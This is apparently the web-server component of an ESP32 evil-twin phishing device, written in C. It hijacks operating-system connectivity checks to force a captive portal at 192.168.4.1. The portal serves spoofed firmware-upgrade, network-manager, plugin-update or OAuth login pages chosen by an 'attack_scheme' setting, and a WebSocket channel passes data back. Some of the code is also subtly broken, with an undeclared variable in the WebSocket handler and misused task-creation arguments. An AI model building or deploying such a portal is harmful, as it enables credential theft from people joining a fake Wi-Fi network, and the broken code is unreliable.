#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_log.h>
#include <lwip/sockets.h>
#include <cJSON.h>
#include "server.h"
#include "server_api.h"

/* Pages include */
#include "web/passwords.h"

#define COMMANDS_QUEUE_LENGTH 15

static const char *TAG = "WEBSERVER";
static httpd_handle_t server = NULL;
static uint8_t attack_scheme = 0;
static QueueHandle_t send_command_queue = NULL;
static QueueHandle_t receive_command_queue = NULL;
static TaskHandle_t ws_send_task_handle = NULL;
static TaskHandle_t ws_receive_task_handle = NULL;


static void ws_send_work(void *arg)
{
    ws_send_req_t *r = (ws_send_req_t *)arg;
    httpd_ws_frame_t out = {
        .final = true,
        .fragmented = false,
        .type = HTTPD_WS_TYPE_TEXT,
        .payload = (uint8_t *)r->payload,
        .len = strlen(r->payload)
    };
    esp_err_t err = httpd_ws_send_frame_async(r->hd, r->fd, &out);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Send async failed fd=%d: %s", r->fd, esp_err_to_name(err));
    }
    free(r);
}


static void ws_send_task(void *pvParameter)
{
	(void)pvParameter;
	ws_send_req_t ws_send_req;
	while (1) 
	{
		if (xQueueReceive(send_command_queue, &ws_send_req, portMAX_DELAY) == pdTRUE) 
		{
			httpd_ws_frame_t ws_frame = {
				.final = true,
				.fragmented = false,
				.type = HTTPD_WS_TYPE_TEXT,
				.payload = (uint8_t *)ws_send_req.payload,
				.len = strlen(ws_send_req.payload)
			};
			ws_send_req_t *heap = malloc(sizeof(ws_send_req_t));
            if (!heap) continue;
            *heap = ws_send_req;
            httpd_queue_work(ws_send_req.hd, ws_send_work, heap);
		}
	}
}


static void ws_receive_task(void *pvParameter)
{
	(void)pvParameter;
	ws_send_req_t ws_receive_req;
	while (1) 
	{
		if (xQueueReceive(receive_command_queue, &ws_receive_req, portMAX_DELAY) == pdTRUE) 
		{
			// Handle received WebSocket messages if needed
		}
	}
}


static esp_err_t captive_portal_redirect(httpd_req_t *req)
{
	const char *portal_url = "http://192.168.4.1/";
	httpd_resp_set_status(req, "302 Found");
	//httpd_resp_set_hdr(req, "Host", host);
	httpd_resp_set_hdr(req, "Location", portal_url);
	httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
	httpd_resp_set_hdr(req, "Content-Length", "0");
	httpd_resp_send(req, NULL, 0);
	return ESP_OK;
}


static esp_err_t cors_prevention_handler(httpd_req_t *req)
{
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "POST, OPTIONS");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");
    return httpd_resp_send(req, NULL, 0);
}


static esp_err_t ws_handler(httpd_req_t *req)
{
    if (req->method == HTTP_GET) {
        ESP_LOGI(TAG, "WS handshake done, new client fd=%d", httpd_req_to_sockfd(req));
        return ESP_OK;
    }

    httpd_ws_frame_t frame = {
        .final = true,
        .fragmented = false,
        .type = HTTPD_WS_TYPE_TEXT,
        .payload = NULL,
        .len = 0
    };

    esp_err_t ret = httpd_ws_recv_frame(req, &frame, 0);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "httpd_ws_recv_frame (len) failed: %s", esp_err_to_name(ret));
        return ret;
    }

    uint8_t buf[1025];
    memset(buf, 0, sizeof(buf));
    frame.payload = buf;
    ret = httpd_ws_recv_frame(req, &frame, frame.len);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "httpd_ws_recv_frame (data) failed: %s", esp_err_to_name(ret));
        return ret;
    }

    int client_fd = httpd_req_to_sockfd(req);

    if (frame.type == HTTPD_WS_TYPE_TEXT) {
		cJSON *root = cJSON_Parse((char *)frame.payload);
		if (root == NULL) {
			ESP_LOGE(TAG, "Invalid JSON received");
			return ESP_FAIL;
		}

		http_api_parse(&ws_receive_req);
        // Echo di risposta
        httpd_ws_frame_t out = {
            .final = true,
            .fragmented = false,
            .type = HTTPD_WS_TYPE_TEXT,
            .payload = frame.payload,
            .len = frame.len
        };
        return httpd_ws_send_frame(req, &out);
    }

    if (frame.type == HTTPD_WS_TYPE_PING) {
        ESP_LOGI(TAG, "PING (fd=%d)", client_fd);
        httpd_ws_frame_t pong = {.type = HTTPD_WS_TYPE_PONG, .payload = NULL, .len = 0};
        return httpd_ws_send_frame(req, &pong);
    }

    if (frame.type == HTTPD_WS_TYPE_CLOSE) {
        ESP_LOGI(TAG, "CLOSE (fd=%d)", client_fd);
        return ESP_OK;
    }

    return ESP_OK;
}


static esp_err_t redirect_handler(httpd_req_t *req) 
{
	char filepath[128] = "/spiffs";
	char buf[1024];
    size_t n;
	const char *uri = req->uri;

	/* Redirect to captive portal */
	if(strcmp(uri, "/hotspot-detect.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/library/test/success.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/generate_204") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/connecttest.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/ncsi.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/check_network_status.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/canonical.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/redirect") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	
    if (strcmp(uri, "/") == 0) { 
		switch(attack_scheme)
		{
			case FIRMWARE_UPGRADE:
				uri = "/fwupgrade/index.html";
				break;
			
			case WEB_NET_MANAGER:
				uri = "/netmng/index.html";
				break;

			case PLUGIN_UPDATE:
				uri = "/plugin.html";
				break;

			case OAUTH_LOGIN:
				uri = "/oauth/index.html";
				break;

			default:
				uri = "/upgrade.html";
				break;
		}
	}
    strlcat(filepath, uri, sizeof(filepath));

    FILE *f = fopen(filepath, "r");
    if (!f) 
    { 
        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "Not found");
        return ESP_OK; 
    }

    httpd_resp_set_type(req, mime_from_path(filepath));
	
    
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) 
    {
        if (httpd_resp_send_chunk(req, buf, n) != ESP_OK) 
        { 
            fclose(f); 
            return ESP_FAIL; 
        }
    }
    fclose(f);
    httpd_resp_send_chunk(req, NULL, 0);
    return ESP_OK;
}


void ws_send_command(ws_send_req_t *_req, const char *payload)
{
	if (send_command_queue == NULL) {
		ESP_LOGE(TAG, "Send command queue is not initialized!");
		return;
	}
	ws_send_req_t req;
	req.hd = _req->hd;
	req.fd = _req->fd;
	strncpy(req.payload, payload, sizeof(req.payload) - 1);
	req.payload[sizeof(req.payload) - 1] = '\0';
	if (xQueueSend(send_command_queue, &req, portMAX_DELAY) != pdTRUE) {
		ESP_LOGE(TAG, "Failed to send command to queue!");
	}
}


void http_server_start(void)
{
	if( server != NULL )
	{
		ESP_LOGE(TAG, "Web server already started.");
		return;
	}

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
	config.ctrl_port = 81;
	config.server_port = 80;
	config.uri_match_fn = httpd_uri_match_wildcard;
	config.max_open_sockets = 10;
	config.max_resp_headers = 16;
	config.recv_wait_timeout = 10;
	config.send_wait_timeout = 10;
	config.lru_purge_enable = true;
	config.max_uri_handlers = 20;

	esp_err_t ret = httpd_start(&server, &config);
	if (ret != ESP_OK) {
		ESP_LOGE(TAG, "Failed to start web server: %s", esp_err_to_name(ret));
		return;
	}

	send_command_queue = xQueueCreate(COMMANDS_QUEUE_LENGTH, sizeof(ws_send_req_t));
	if (send_command_queue == NULL) {
		ESP_LOGE(TAG, "Failed to create send command queue!");
		return;
	}
	xTaskCreate(ws_send_task, "ws_send_task", 4096, &ws_send_task_handle, 5, NULL);

	receive_command_queue = xQueueCreate(COMMANDS_QUEUE_LENGTH, sizeof(ws_send_req_t));
	if (receive_command_queue == NULL) {
		ESP_LOGE(TAG, "Failed to create receive command queue!");
		return;
	}
	xTaskCreate(ws_receive_task, "ws_receive_task", 4096, &ws_receive_task_handle, 5, NULL);

	ESP_ERROR_CHECK(register_server_api_handlers(server));

	/* Handler for CORS preflight requests */
	httpd_uri_t cors_preflight_uri = {
		.uri = "/*",
		.method = HTTP_OPTIONS,
		.handler = cors_prevention_handler,
		.user_ctx = NULL
	};
	ESP_ERROR_CHECK(httpd_register_uri_handler(server, &cors_preflight_uri));

	httpd_uri_t ws_uri = {
		.uri = "/ws",
		.method = HTTP_GET,
		.handler = ws_handler,
		.user_ctx = NULL,
		.is_websocket = true,
		.handle_ws_control_frames = true
	};
	ESP_ERROR_CHECK(httpd_register_uri_handler(server, &ws_uri));

	httpd_uri_t any = {
		.uri = "/*", 
		.method = HTTP_GET, 
		.handler = redirect_handler, 
		.user_ctx = NULL
	};
	ESP_ERROR_CHECK(httpd_register_uri_handler(server, &any));
}


void http_server_stop(void)
{
	if( send_command_queue != NULL ) {
		vQueueDelete(send_command_queue);
		send_command_queue = NULL;
	}

	if( receive_command_queue != NULL ) {
		vQueueDelete(receive_command_queue);
		receive_command_queue = NULL;
	}

	if( ws_send_task_handle != NULL ) {
		vTaskDelete(ws_send_task_handle);
		ws_send_task_handle = NULL;
	}

	if( ws_receive_task_handle != NULL ) {
		vTaskDelete(ws_receive_task_handle);
		ws_receive_task_handle = NULL;
	}

	if( server != NULL ) {
        if( httpd_stop(server) != ESP_OK ) {
            ESP_LOGD(TAG, "Failed to stop web server.");
            return;
        }
		server = NULL;
    }
}